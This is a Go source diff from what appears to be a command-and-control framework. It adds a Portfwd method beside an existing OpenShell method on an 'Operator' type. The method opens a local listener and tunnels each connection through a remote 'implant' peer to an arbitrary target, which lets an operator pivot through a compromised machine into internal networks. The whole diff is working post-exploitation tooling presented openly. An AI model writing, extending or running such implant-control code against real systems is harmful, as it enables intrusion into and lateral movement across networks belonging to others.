@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"net"
 	"os"
 	"sync"
 	"time"
@@ -404,6 +405,47 @@ func (o *Operator) OpenShell(implantPeerID string) error {
 
 	<-errCh
 	return nil
+}
+
+func (o *Operator) Portfwd(implantPeerID string, localPort int, target string) error {
+	pid, err := peer.Decode(implantPeerID)
+	if err != nil {
+		return fmt.Errorf("decode peer id %s: %w", implantPeerID, err)
+	}
+
+	listener, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", localPort))
+	if err != nil {
+		return fmt.Errorf("listen 127.0.0.1:%d: %w", localPort, err)
+	}
+	defer listener.Close()
+
+	log.Printf("[operator] portfwd: forwarding 127.0.0.1:%d -> %s via %s", localPort, target, implantPeerID)
+
+	for {
+		localConn, err := listener.Accept()
+		if err != nil {
+			return err
+		}
+
+		go func() {
+			defer localConn.Close()
+
+			s, err := o.node.NewStream(o.ctx, pid, transport.PortfwdProtocolID)
+			if err != nil {
+				log.Printf("[operator] portfwd stream: %v", err)
+				return
+			}
+			defer s.Close()
+
+			if _, err := fmt.Fprintf(s, "%s\n", target); err != nil {
+				log.Printf("[operator] portfwd send target: %v", err)
+				return
+			}
+
+			go io.Copy(s, localConn)
+			io.Copy(localConn, s)
+		}()
+	}
 }
 
 func (o *Operator) Close() error {
